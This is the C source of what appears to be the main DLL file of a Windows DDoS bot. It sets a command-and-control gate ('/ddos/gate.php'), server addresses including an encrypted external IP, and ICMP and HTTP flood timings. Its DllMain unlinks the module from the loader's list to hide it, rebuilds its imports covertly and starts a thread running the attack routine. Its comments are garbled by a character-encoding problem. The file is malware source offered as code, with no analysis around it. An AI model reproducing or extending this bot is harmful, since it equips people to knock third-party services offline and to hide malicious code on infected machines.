/*
	_____________ CONFIG _______________
	see bot_config.h !!!!!!!!

	ToDo:
		+ �������� ����������� �������� ����� ������ ��� HTTP �����
*/
#define _DEBUG_
//#ifdef _DEBUG_
#define CONFIG_PATH_TO_SCRIPT	"/ddos/gate.php"		// ���� �� �������
#define CONFIG_WEB_HOST_NAME	"192.168.1.2"			// ��� ������
#define CONFIG_IP_SERVER		"192.168.1.2"			// IP ����� �������
//#else
//#define CONFIG_PATH_TO_SCRIPT	DeCrypt("\x44\x77\x77\x84\xe8\x44\x7c\x7a\xe7\x7e\x45\x83\x7b\x83\x53\x53")
//#define CONFIG_WEB_HOST_NAME	DeCrypt("\xe8\xee\x86\x86\x7e\xe9\x81\x7a\x86\x45\x7d\x82\xe9\xe8\xe7\xed\x77\xe8\x45\xe9\xee")// ��� ������
//#define CONFIG_IP_SERVER		DeCrypt("\xab\xa9\x45\xaa\xa7\xad\x45\xad\xa9\x45\xaa\xa8\xa9")	//"82.146.62.132"			// IP ����� �������
//#endif

#define CONFIG_ICMP_SLEEP_TIME  200
#define CONFIG_HTTP_SLEEP_TIME  200

#define CONFIG_PORT_SERVER		80
//#define CONFIG_WEB_HOST_NAME	/* 192.168.1.2  */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xaa\x45\xa9"
//#define CONFIG_IP_SERVER		/* 192.168.1.2 */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xaa\x45\xa9"

//#define CONFIG_WEB_HOST_NAME	/* 192.168.200.1  */"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xa9\x43\x43\x45\xaa"
//#define CONFIG_IP_SERVER		/* 192.168.200.1 */	"\xaa\xb2\xa9\x45\xaa\xad\xab\x45\xa9\x43\x43\x45\xaa"

//#define CONFIG_WEB_HOST_NAME	/* 10.1.1.28  */	"\xaa\x43\x45\xaa\x45\xaa\x45\xa9\xab"
//#define CONFIG_IP_SERVER		/* 10.1.1.28  */	"\xaa\x43\x45\xaa\x45\xaa\x45\xa9\xab"

#define CONFIG_KNOCK_TIME		10						// �������� � ������� ����� ��� ����� ����������� � �������

//#define _DEBUG_
//#define _DEBUG_SOCKET_ 

#include "bot_core.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){	

	UnlinkDll(hinstDLL);

	if(g_bCreated)
		return TRUE;

	if(!ReassembleImport())
		return FALSE;
	if(!InitConfig())
		return FALSE;
	
	g_hThread = api.pOpenThread(THREAD_QUERY_INFORMATION,FALSE,g_dwThreadId);
	if(!g_hThread)
	{
		g_hThread = api.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DDoS, NULL, 0, &g_dwThreadId);
		if(g_hThread)
			g_bCreated = TRUE;
		else
			g_bCreated = FALSE;
	}	else	{
		api.pCloseHandle(g_hThread);
	}

	return TRUE;
}
